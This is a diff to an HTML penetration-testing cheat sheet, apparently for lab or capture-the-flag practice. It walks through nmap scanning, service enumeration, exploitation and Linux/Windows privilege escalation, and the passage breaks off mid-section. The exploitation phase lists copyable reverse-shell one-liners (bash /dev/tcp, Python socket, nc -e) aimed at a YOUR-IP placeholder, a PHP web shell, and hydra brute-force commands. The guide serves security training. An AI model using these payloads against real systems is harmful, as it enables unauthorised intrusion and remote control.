+                                    <td>Aggressive</td>
+                                    <td><code>nmap -A &lt;ip&gt;</code></td>
+                                    <td>OS detection + traceroute + scripts (noisy)</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="callout callout-info">
+                        <span class="callout-icon">📝</span>
+                        <div class="callout-content">
+                            <div class="callout-title">Document Everything</div>
+                            Write down every open port and version number. Each version is a potential key — search for exploits using the exact version string.
+                        </div>
+                    </div>
+
+                    <div class="checklist">
+                        <div class="checklist-title">✓ Scan Checklist</div>
+                        <div class="checklist-item" data-id="initial-scan">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">Initial scan complete (<code>nmap -sC -sV</code>)</span>
+                        </div>
+                        <div class="checklist-item" data-id="ports-documented">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">All open ports documented</span>
+                        </div>
+                        <div class="checklist-item" data-id="versions-noted">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">Service versions noted</span>
+                        </div>
+                        <div class="checklist-item" data-id="full-port-scan">
+                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                            <span class="checklist-label">Full port scan if needed (<code>-p-</code>)</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Phase 2: Enumerate -->
+            <section id="phase-2" class="phase-section open" data-phase="enum">
                 <div class="phase-header" onclick="togglePhase(this)">
                     <div class="phase-icon">🔍</div>
                     <div class="phase-header-content">
-                        <div class="phase-number">PHASE 1</div>
-                        <div class="phase-title">Reconnaissance</div>
-                        <div class="phase-question">"What exists? What can I see?"</div>
-                    </div>
-                    <span class="phase-toggle">COLLAPSE</span>
-                </div>
-                <div class="phase-content">
-                    <div class="reference-table">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Goal</th>
-                                    <th>Command / Tool</th>
-                                    <th>Notes</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>Find live hosts</td>
-                                    <td><code>nmap -sn &lt;target-range&gt;</code></td>
-                                    <td>Ping sweep</td>
-                                </tr>
-                                <tr>
-                                    <td>Find open ports</td>
-                                    <td><code>nmap &lt;target&gt;</code></td>
-                                    <td>Default top 1000 ports</td>
-                                </tr>
-                                <tr>
-                                    <td>Full port scan</td>
-                                    <td><code>nmap -p- &lt;target&gt;</code></td>
-                                    <td>All 65535 ports (slow)</td>
-                                </tr>
-                                <tr>
-                                    <td>Quick scan</td>
-                                    <td><code>nmap -F &lt;target&gt;</code></td>
-                                    <td>Top 100 ports (fast)</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-
-                    <div class="checklist">
-                        <div class="checklist-title">✓ Checklist</div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Target IP confirmed</span>
-                        </div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Ports identified</span>
-                        </div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Services noted</span>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Phase 2: Enumeration -->
-            <section id="enum" class="phase-section open" data-phase="enum">
-                <div class="phase-header" onclick="togglePhase(this)">
-                    <div class="phase-icon">📋</div>
-                    <div class="phase-header-content">
                         <div class="phase-number">PHASE 2</div>
-                        <div class="phase-title">Enumeration</div>
-                        <div class="phase-question">"What can I learn about what I found?"</div>
+                        <div class="phase-title">Enumerate — Choose Your Path</div>
+                        <div class="phase-subtitle">"Based on what ports you found, follow the specific playbook"</div>
                     </div>
                     <span class="phase-toggle">COLLAPSE</span>
                 </div>
                 <div class="phase-content">
-                    <div class="reference-table">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Service</th>
-                                    <th>Tools</th>
-                                    <th>What to look for</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>HTTP (80/443)</td>
-                                    <td>Browser, gobuster dir, nikto</td>
-                                    <td>Directories, login pages, versions</td>
-                                </tr>
-                                <tr>
-                                    <td>SSH (22)</td>
-                                    <td>nc banner grab</td>
-                                    <td>Version, try default creds later</td>
-                                </tr>
-                                <tr>
-                                    <td>SMB (445)</td>
-                                    <td>enum4linux, smbclient</td>
-                                    <td>Shares, users</td>
-                                </tr>
-                                <tr>
-                                    <td>FTP (21)</td>
-                                    <td>ftp, check anonymous login</td>
-                                    <td>Files, upload ability</td>
-                                </tr>
-                                <tr>
-                                    <td>DNS (53)</td>
-                                    <td>nslookup, dig</td>
-                                    <td>Zone transfers, subdomains</td>
-                                </tr>
-                                <tr>
-                                    <td>Unknown ports</td>
-                                    <td><code>nc &lt;ip&gt; &lt;port&gt;</code>, <code>nmap -sV</code></td>
-                                    <td>Banner grab, identify service</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-
-                    <div class="command-block">
-                        <div class="command-block-title">Common Gobuster Command</div>
-                        <div class="command-line">
-                            <span class="prompt">$ </span><span class="cmd">gobuster dir</span> <span class="flag">-u</span> http://&lt;target&gt; <span class="flag">-w</span> /usr/share/wordlists/dirb/common.txt
+                    <!-- Decision Tree -->
+                    <div class="decision-tree">
+                        <div class="decision-root">🎯 Open Ports Found — Click the matching service below</div>
+                        <div class="decision-branches">
+                            <div class="decision-branch" onclick="openService('web')">
+                                <span class="decision-branch-icon">🌐</span>
+                                <span class="decision-branch-port">Port 80/443</span>
+                                <span class="decision-branch-name">Web</span>
+                            </div>
+                            <div class="decision-branch" onclick="openService('ftp')">
+                                <span class="decision-branch-icon">📁</span>
+                                <span class="decision-branch-port">Port 21</span>
+                                <span class="decision-branch-name">FTP</span>
+                            </div>
+                            <div class="decision-branch" onclick="openService('smb')">
+                                <span class="decision-branch-icon">📂</span>
+                                <span class="decision-branch-port">Port 445</span>
+                                <span class="decision-branch-name">SMB</span>
+                            </div>
+                            <div class="decision-branch" onclick="openService('ssh')">
+                                <span class="decision-branch-icon">🔐</span>
+                                <span class="decision-branch-port">Port 22</span>
+                                <span class="decision-branch-name">SSH</span>
+                            </div>
+                            <div class="decision-branch" onclick="openService('other')">
+                                <span class="decision-branch-icon">❓</span>
+                                <span class="decision-branch-port">Other</span>
+                                <span class="decision-branch-name">Unknown</span>
+                            </div>
                         </div>
                     </div>
 
-                    <div class="checklist">
-                        <div class="checklist-title">✓ Checklist</div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Service versions identified (nmap -sV)</span>
+                    <!-- Service Cards -->
+                    <div class="service-cards">
+                        <!-- Web Enumeration -->
+                        <div id="service-web" class="service-card" data-service="web">
+                            <div class="service-header" onclick="toggleService(this)">
+                                <div class="service-icon">🌐</div>
+                                <div class="service-header-content">
+                                    <div class="service-title">Web Enumeration</div>
+                                    <div class="service-ports">Port 80 (HTTP) / Port 443 (HTTPS)</div>
+                                </div>
+                                <span class="service-toggle">EXPAND</span>
+                            </div>
+                            <div class="service-content">
+                                <div class="service-goal">Goal</div>
+                                <p class="service-goal-text">Find hidden pages, admin panels, vulnerable applications, and version numbers to exploit.</p>
+
+                                <div class="step-table">
+                                    <table>
+                                        <thead>
+                                            <tr>
+                                                <th>Step</th>
+                                                <th>Action</th>
+                                                <th>Command</th>
+                                                <th>Why</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td class="step-num">1</td>
+                                                <td>Browse the site</td>
+                                                <td>Open in browser</td>
+                                                <td>Visual inspection, read comments, look for names/usernames</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">2</td>
+                                                <td>Check robots.txt</td>
+                                                <td><code>curl http://&lt;ip&gt;/robots.txt</code></td>
+                                                <td>Lists hidden paths the site doesn't want indexed</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">3</td>
+                                                <td>Find hidden directories</td>
+                                                <td><code>gobuster dir -u http://&lt;ip&gt; -w /usr/share/wordlists/dirb/common.txt</code></td>
+                                                <td>Find /admin, /backup, /uploads, etc.</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">4</td>
+                                                <td>Identify technology</td>
+                                                <td><code>whatweb http://&lt;ip&gt;</code></td>
+                                                <td>Identifies CMS (WordPress, Joomla), frameworks, versions</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">5</td>
+                                                <td>Vulnerability scan</td>
+                                                <td><code>nikto -h http://&lt;ip&gt;</code></td>
+                                                <td>Automated check for misconfigurations</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">6</td>
+                                                <td>Check source code</td>
+                                                <td>Right-click → View Source</td>
+                                                <td>Look for comments, hidden forms, JavaScript clues</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+
+                                <div class="findings-list">
+                                    <div class="findings-title">Common Findings → Next Steps</div>
+                                    <div class="finding-item">
+                                        <span class="finding-trigger">Found login page →</span>
+                                        <span class="finding-action">Try default creds (admin/admin), then consider brute force with hydra</span>
+                                    </div>
+                                    <div class="finding-item">
+                                        <span class="finding-trigger">Found WordPress →</span>
+                                        <span class="finding-action">Run <code>wpscan --url http://&lt;ip&gt; -e ap,at,u</code></span>
+                                    </div>
+                                    <div class="finding-item">
+                                        <span class="finding-trigger">Found file upload →</span>
+                                        <span class="finding-action">Test if you can upload a PHP shell (.php, .phtml, .php5)</span>
+                                    </div>
+                                    <div class="finding-item">
+                                        <span class="finding-trigger">Found version number →</span>
+                                        <span class="finding-action">Search: <code>searchsploit &lt;software&gt; &lt;version&gt;</code></span>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Web directories enumerated</span>
+
+                        <!-- FTP Enumeration -->
+                        <div id="service-ftp" class="service-card" data-service="ftp">
+                            <div class="service-header" onclick="toggleService(this)">
+                                <div class="service-icon">📁</div>
+                                <div class="service-header-content">
+                                    <div class="service-title">FTP Enumeration</div>
+                                    <div class="service-ports">Port 21</div>
+                                </div>
+                                <span class="service-toggle">EXPAND</span>
+                            </div>
+                            <div class="service-content">
+                                <div class="service-goal">Goal</div>
+                                <p class="service-goal-text">Check for anonymous access, find sensitive files, identify vulnerable versions.</p>
+
+                                <div class="step-table">
+                                    <table>
+                                        <thead>
+                                            <tr>
+                                                <th>Step</th>
+                                                <th>Action</th>
+                                                <th>Command</th>
+                                                <th>Why</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td class="step-num">1</td>
+                                                <td>Try anonymous login</td>
+                                                <td><code>ftp &lt;ip&gt;</code> → username: <code>anonymous</code></td>
+                                                <td>Common misconfiguration allows guest access</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">2</td>
+                                                <td>List all files</td>
+                                                <td><code>ls -la</code></td>
+                                                <td>Look for configs, passwords, scripts, hidden files</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">3</td>
+                                                <td>Download files</td>
+                                                <td><code>get filename</code></td>
+                                                <td>Examine files locally for credentials or clues</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">4</td>
+                                                <td>Check for upload</td>
+                                                <td><code>put testfile.txt</code></td>
+                                                <td>If writable, you might upload a shell</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">5</td>
+                                                <td>Check version</td>
+                                                <td><code>searchsploit &lt;ftp-version&gt;</code></td>
+                                                <td>e.g., vsftpd 2.3.4 has a famous backdoor</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+
+                                <div class="callout callout-tip">
+                                    <span class="callout-icon">💡</span>
+                                    <div class="callout-content">
+                                        <div class="callout-title">Pro Tip</div>
+                                        If anonymous login works, always check if FTP is connected to the web root. Files you upload via FTP might be accessible via HTTP.
+                                    </div>
+                                </div>
+                            </div>
                         </div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Banners grabbed from unknown services</span>
+
+                        <!-- SMB Enumeration -->
+                        <div id="service-smb" class="service-card" data-service="smb">
+                            <div class="service-header" onclick="toggleService(this)">
+                                <div class="service-icon">📂</div>
+                                <div class="service-header-content">
+                                    <div class="service-title">SMB Enumeration</div>
+                                    <div class="service-ports">Port 445 (also 139)</div>
+                                </div>
+                                <span class="service-toggle">EXPAND</span>
+                            </div>
+                            <div class="service-content">
+                                <div class="service-goal">Goal</div>
+                                <p class="service-goal-text">Find open shares, enumerate users, discover sensitive files.</p>
+
+                                <div class="step-table">
+                                    <table>
+                                        <thead>
+                                            <tr>
+                                                <th>Step</th>
+                                                <th>Action</th>
+                                                <th>Command</th>
+                                                <th>Why</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td class="step-num">1</td>
+                                                <td>List shares</td>
+                                                <td><code>smbclient -L //&lt;ip&gt;</code></td>
+                                                <td>See what shares exist on the target</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">2</td>
+                                                <td>Try null session</td>
+                                                <td><code>smbclient //&lt;ip&gt;/sharename -N</code></td>
+                                                <td>-N means no password (anonymous)</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">3</td>
+                                                <td>Full enumeration</td>
+                                                <td><code>enum4linux -a &lt;ip&gt;</code></td>
+                                                <td>Extracts users, groups, shares, password policy</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">4</td>
+                                                <td>Connect to share</td>
+                                                <td><code>smbclient //&lt;ip&gt;/share -U user</code></td>
+                                                <td>If you found credentials, access the share</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+
+                                <div class="command-block">
+                                    <div class="command-block-title">Once connected to a share</div>
+                                    <div class="command-line"><span class="cmd">ls</span> <span class="comment"># List files</span></div>
+                                    <div class="command-line"><span class="cmd">cd directory</span> <span class="comment"># Change directory</span></div>
+                                    <div class="command-line"><span class="cmd">get filename</span> <span class="comment"># Download file</span></div>
+                                    <div class="command-line"><span class="cmd">mget *</span> <span class="comment"># Download all files</span></div>
+                                </div>
+                            </div>
                         </div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Subdomains checked (if applicable)</span>
+
+                        <!-- SSH -->
+                        <div id="service-ssh" class="service-card" data-service="ssh">
+                            <div class="service-header" onclick="toggleService(this)">
+                                <div class="service-icon">🔐</div>
+                                <div class="service-header-content">
+                                    <div class="service-title">SSH</div>
+                                    <div class="service-ports">Port 22</div>
+                                </div>
+                                <span class="service-toggle">EXPAND</span>
+                            </div>
+                            <div class="service-content">
+                                <div class="callout callout-warning">
+                                    <span class="callout-icon">⚠️</span>
+                                    <div class="callout-content">
+                                        <div class="callout-title">Important</div>
+                                        SSH is rarely the first entry point. Usually you need credentials found elsewhere (web, FTP, SMB) before SSH becomes useful.
+                                    </div>
+                                </div>
+
+                                <div class="step-table">
+                                    <table>
+                                        <thead>
+                                            <tr>
+                                                <th>Step</th>
+                                                <th>Action</th>
+                                                <th>Command</th>
+                                                <th>Why</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td class="step-num">1</td>
+                                                <td>Try found credentials</td>
+                                                <td><code>ssh user@&lt;ip&gt;</code></td>
+                                                <td>If you found creds from web/ftp/smb</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">2</td>
+                                                <td>Use private key</td>
+                                                <td><code>ssh -i id_rsa user@&lt;ip&gt;</code></td>
+                                                <td>If you found an SSH private key file</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">3</td>
+                                                <td>Brute force (last resort)</td>
+                                                <td><code>hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;ip&gt;</code></td>
+                                                <td>Only if you have a confirmed username</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+
+                                <div class="callout callout-tip">
+                                    <span class="callout-icon">💡</span>
+                                    <div class="callout-content">
+                                        <div class="callout-title">Found a Private Key?</div>
+                                        Set correct permissions first: <code>chmod 600 id_rsa</code> then connect with <code>ssh -i id_rsa user@ip</code>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Other Ports -->
+                        <div id="service-other" class="service-card" data-service="other">
+                            <div class="service-header" onclick="toggleService(this)">
+                                <div class="service-icon">❓</div>
+                                <div class="service-header-content">
+                                    <div class="service-title">Other / Unknown Ports</div>
+                                    <div class="service-ports">Any unusual port</div>
+                                </div>
+                                <span class="service-toggle">EXPAND</span>
+                            </div>
+                            <div class="service-content">
+                                <div class="service-goal">Goal</div>
+                                <p class="service-goal-text">Identify what service is running and research potential vulnerabilities.</p>
+
+                                <div class="step-table">
+                                    <table>
+                                        <thead>
+                                            <tr>
+                                                <th>Step</th>
+                                                <th>Action</th>
+                                                <th>Command</th>
+                                                <th>Why</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td class="step-num">1</td>
+                                                <td>Banner grab</td>
+                                                <td><code>nc &lt;ip&gt; &lt;port&gt;</code></td>
+                                                <td>See what information the service reveals</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">2</td>
+                                                <td>Service detection</td>
+                                                <td><code>nmap -sV -p &lt;port&gt; &lt;ip&gt;</code></td>
+                                                <td>More detailed service identification</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">3</td>
+                                                <td>Research</td>
+                                                <td>Google: "&lt;service&gt; &lt;version&gt; exploit"</td>
+                                                <td>Find known vulnerabilities and CVEs</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="step-num">4</td>
+                                                <td>Searchsploit</td>
+                                                <td><code>searchsploit &lt;service-name&gt;</code></td>
+                                                <td>Check local exploit database</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
             </section>
 
-            <!-- Phase 3: Exploitation -->
-            <section id="exploit" class="phase-section open" data-phase="exploit">
+            <!-- Phase 3: Exploit -->
+            <section id="phase-3" class="phase-section open" data-phase="exploit">
                 <div class="phase-header" onclick="togglePhase(this)">
                     <div class="phase-icon">💥</div>
                     <div class="phase-header-content">
                         <div class="phase-number">PHASE 3</div>
-                        <div class="phase-title">Exploitation</div>
-                        <div class="phase-question">"Can I get in?"</div>
+                        <div class="phase-title">Exploit — Get In</div>
+                        <div class="phase-subtitle">"Use what you found to gain access"</div>
                     </div>
                     <span class="phase-toggle">COLLAPSE</span>
                 </div>
                 <div class="phase-content">
-                    <div class="reference-table">
+                    <div class="section-label">The Systematic Approach</div>
+                    
+                    <div class="step-table">
                         <table>
                             <thead>
                                 <tr>
-                                    <th>Vector</th>
-                                    <th>Tools</th>
-                                    <th>Notes</th>
+                                    <th>Step</th>
+                                    <th>Action</th>
+                                    <th>Details</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td>Default credentials</td>
-                                    <td>Manual, hydra</td>
-                                    <td>admin:admin, root:root, service defaults</td>
+                                    <td class="step-num">1</td>
+                                    <td>Search for exploits</td>
+                                    <td><code>searchsploit &lt;service&gt; &lt;version&gt;</code> or Google: "&lt;service&gt; &lt;version&gt; exploit CVE"</td>
                                 </tr>
                                 <tr>
-                                    <td>Brute force login</td>
-                                    <td><code>hydra -l &lt;user&gt; -P &lt;wordlist&gt; &lt;target&gt; &lt;service&gt;</code></td>
-                                    <td>SSH, FTP, web forms</td>
+                                    <td class="step-num">2</td>
+                                    <td>Read the exploit</td>
+                                    <td>Understand what it does. Check if it needs modifications (IP, port, path)</td>
                                 </tr>
                                 <tr>
-                                    <td>Known CVEs</td>
-                                    <td><code>searchsploit &lt;service version&gt;</code></td>
-                                    <td>Check exploit-db</td>
+                                    <td class="step-num">3</td>
+                                    <td>Start your listener</td>
+                                    <td><code>nc -lvnp 4444</code> — Always start BEFORE running exploit</td>
                                 </tr>
                                 <tr>
-                                    <td>Web vulnerabilities</td>
-                                    <td>Manual, burpsuite</td>
-                                    <td>SQLi, command injection, LFI</td>
-                                </tr>
-                                <tr>
-                                    <td>File upload</td>
-                                    <td>Manual</td>
-                                    <td>Upload reverse shell if allowed</td>
+                                    <td class="step-num">4</td>
+                                    <td>Run the exploit</td>
+                                    <td>Execute and watch your listener for incoming connection</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
 
-                    <div class="command-block">
-                        <div class="command-block-title">Getting a Shell - Start Listener First</div>
-                        <div class="command-line">
-                            <span class="prompt">$ </span><span class="cmd">nc</span> <span class="flag">-lvnp</span> 4444 <span class="comment"># Listener on your machine</span>
+                    <div class="section-label">Start Your Listener First</div>
+                    <div class="command-prominent">
+                        <code>nc -lvnp 4444</code>
+                        <div class="command-copy" onclick="copyCommand(this)">COPY</div>
+                    </div>
+                    <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: -10px;">Run this BEFORE executing any reverse shell exploit. It waits for the target to connect back to you.</p>
+
+                    <div class="section-label">Common Reverse Shell Payloads</div>
+                    <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 16px;">Replace YOUR-IP with your machine's IP address (check with <code>ip addr</code>)</p>
+
+                    <div class="payload-block">
+                        <div class="payload-label">Bash</div>
+                        <div class="payload-code">bash -i >& /dev/tcp/YOUR-IP/4444 0>&1</div>
+                        <div class="payload-copy" onclick="copyPayload(this)">COPY</div>
+                    </div>
+
+                    <div class="payload-block">
+                        <div class="payload-label">Python</div>
+                        <div class="payload-code">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</div>
+                        <div class="payload-copy" onclick="copyPayload(this)">COPY</div>
+                    </div>
+
+                    <div class="payload-block">
+                        <div class="payload-label">Netcat (if available on target)</div>
+                        <div class="payload-code">nc YOUR-IP 4444 -e /bin/bash</div>
+                        <div class="payload-copy" onclick="copyPayload(this)">COPY</div>
+                    </div>
+
+                    <div class="payload-block">
+                        <div class="payload-label">PHP (for web shells)</div>
+                        <div class="payload-code">&lt;?php system($_GET['cmd']); ?&gt;</div>
+                        <div class="payload-copy" onclick="copyPayload(this)">COPY</div>
+                    </div>
+
+                    <div class="callout callout-tip">
+                        <span class="callout-icon">💡</span>
+                        <div class="callout-content">
+                            <div class="callout-title">Upgrade Your Shell</div>
+                            Once you get a basic shell, upgrade it for better functionality:<br>
+                            <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>
                         </div>
                     </div>
 
                     <div class="checklist">
-                        <div class="checklist-title">✓ Checklist</div>
-                        <div class="checklist-item">
+                        <div class="checklist-title">✓ Exploitation Checklist</div>
+                        <div class="checklist-item" data-id="exploit-found">
                             <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Default creds tried</span>
+                            <span class="checklist-label">Exploit found and understood</span>
                         </div>
-                        <div class="checklist-item">
+                        <div class="checklist-item" data-id="listener-running">
                             <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Known exploits searched</span>
+                            <span class="checklist-label">Listener running on your machine</span>
                         </div>
-                        <div class="checklist-item">
+                        <div class="checklist-item" data-id="exploit-executed">
                             <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Web vulnerabilities tested</span>
+                            <span class="checklist-label">Exploit executed</span>
                         </div>
-                        <div class="checklist-item">
+                        <div class="checklist-item" data-id="shell-received">
                             <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Initial access gained</span>
+                            <span class="checklist-label">Shell received</span>
                         </div>
                     </div>
                 </div>
             </section>
 
-            <!-- Phase 4: Post-Exploitation -->
-            <section id="post" class="phase-section open" data-phase="post">
+            <!-- Phase 4: Privilege Escalation -->
+            <section id="phase-4" class="phase-section open" data-phase="escalate">
                 <div class="phase-header" onclick="togglePhase(this)">
-                    <div class="phase-icon">🚀</div>
+                    <div class="phase-icon">⬆️</div>
                     <div class="phase-header-content">
                         <div class="phase-number">PHASE 4</div>
-                        <div class="phase-title">Post-Exploitation</div>
-                        <div class="phase-question">"I'm in. Now what?"</div>
+                        <div class="phase-title">Escalate — Become Root</div>
+                        <div class="phase-subtitle">"You're in as a low user. Now become god."</div>
                     </div>
                     <span class="phase-toggle">COLLAPSE</span>
                 </div>
                 <div class="phase-content">
-                    <div class="section-label">Situational Awareness Commands</div>
-                    <div class="command-block">
-                        <div class="command-line"><span class="cmd">whoami</span> <span class="comment"># Who am I?</span></div>
-                        <div class="command-line"><span class="cmd">id</span> <span class="comment"># What groups?</span></div>
-                        <div class="command-line"><span class="cmd">hostname</span> <span class="comment"># What machine?</span></div>
-                        <div class="command-line"><span class="cmd">ip addr</span> / <span class="cmd">ifconfig</span> <span class="comment"># What network?</span></div>
-                        <div class="command-line"><span class="cmd">pwd</span> <span class="comment"># Where am I?</span></div>
-                        <div class="command-line"><span class="cmd">ls -la</span> <span class="comment"># What's here?</span></div>
+                    <!-- Linux Privesc -->
+                    <div class="privesc-section">
+                        <div class="privesc-title"><span>🐧</span> Linux Privilege Escalation</div>
+
+                        <div class="section-label">Immediate Checks</div>
+                        <div class="step-table">
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Check</th>
+                                        <th>Command</th>
+                                        <th>Looking For</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Who am I?</td>
+                                        <td><code>whoami && id</code></td>
+                                        <td>Current user and group memberships</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Sudo rights</td>
+                                        <td><code>sudo -l</code></td>
+                                        <td>Commands you can run as root</td>
+                                    </tr>
+                                    <tr>
+                                        <td>SUID binaries</td>
+                                        <td><code>find / -perm -4000 2>/dev/null</code></td>
+                                        <td>Files that run with owner's privileges</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Cron jobs</td>
+                                        <td><code>cat /etc/crontab</code></td>
+                                        <td>Scheduled tasks you might exploit</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Writable files</td>
+                                        <td><code>find / -writable 2>/dev/null | grep -v proc</code></td>
+                                        <td>Files you can modify</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Kernel version</td>
+                                        <td><code>uname -a</code></td>
+                                        <td>Outdated kernels may have exploits</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <div class="section-label">Automated Enumeration</div>
+                        <div class="command-prominent">
+                            <code>./linpeas.sh</code>
+                            <div class="command-copy" onclick="copyCommand(this)">COPY</div>
+                        </div>
+                        <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: -10px;">Upload LinPEAS to target and run. Look for RED and YELLOW highlights.</p>
+
+                        <div class="callout callout-tip">
+                            <span class="callout-icon">🔗</span>
+                            <div class="callout-content">
+                                <div class="callout-title">GTFOBins</div>
+                                Found a SUID binary or sudo command? Check <strong>gtfobins.github.io</strong> for exploitation techniques. Search for the binary name to find ways to escalate.
+                            </div>
+                        </div>
                     </div>
 
-                    <div class="section-label">Privilege Escalation</div>
-                    <div class="reference-table">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>OS</th>
-                                    <th>Tool</th>
-                                    <th>Command</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>Linux</td>
-                                    <td>LinPEAS</td>
-                                    <td><code>./linpeas.sh</code></td>
-                                </tr>
-                                <tr>
-                                    <td>Windows</td>
-                                    <td>WinPEAS</td>
-                                    <td><code>.\winpeas.exe</code></td>
-                                </tr>
-                                <tr>
-                                    <td>Linux</td>
-                                    <td>Manual</td>
-                                    <td><code>sudo -l</code>, check SUID binaries</td>
-                                </tr>
-                                <tr>
-                                    <td>Both</td>
-                                    <td>GTFOBins / LOLBAS</td>
-                                    <td>Search for exploitable binaries</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+                    <!-- Windows Privesc -->
+                    <div class="privesc-section">
+                        <div class="privesc-title"><span>🪟</span> Windows Privilege Escalation</div>
 
+                        <div class="section-label">Immediate Checks</div>
+                        <div class="step-table">
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Check</th>
+                                        <th>Command</th>
+                                        <th>Looking For</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Who am I?</td>
+                                        <td><code>whoami /all</code></td>
+                                        <td>User, groups, and all privileges</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Privileges</td>
+                                        <td><code>whoami /priv</code></td>
+                                        <td>SeImpersonate, SeBackup (exploitable)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>System info</td>
+                                        <td><code>systeminfo</code></td>
+                                        <td>OS version, hotfixes (missing patches)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Users</td>
+                                        <td><code>net user</code></td>
+                                        <td>Other accounts on the system</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Services</td>
+                                        <td><code>sc query</code></td>
+                                        <td>Running services, misconfigured ones</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <div class="section-label">Automated Enumeration</div>
+                        <div class="command-prominent">
+                            <code>.\winpeas.exe</code>
+                            <div class="command-copy" onclick="copyCommand(this)">COPY</div>
+                        </div>
+                        <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: -10px;">Upload WinPEAS to target and run. Focus on highlighted findings.</p>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">🥔</span>
